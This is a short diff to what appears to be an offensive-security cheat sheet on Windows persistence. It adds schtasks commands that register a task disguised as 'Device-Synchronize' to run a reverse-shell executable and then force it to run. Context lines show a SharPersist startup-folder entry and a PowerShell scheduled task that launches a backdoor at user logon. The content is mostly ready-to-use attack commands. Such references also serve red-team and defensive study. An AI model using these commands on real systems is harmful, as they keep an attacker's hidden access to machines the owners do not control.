@@ -102,6 +102,17 @@ SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -
 
 ### Scheduled Tasks User
 
+Using native **schtask**
+
+```powershell
+# Create the scheduled tasks to run once at 00.00
+schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
+# Force run it now !
+schtasks /run /tn "Device-Synchronize"
+```
+
+Using Powershell
+
 ```powershell
 PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
 PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
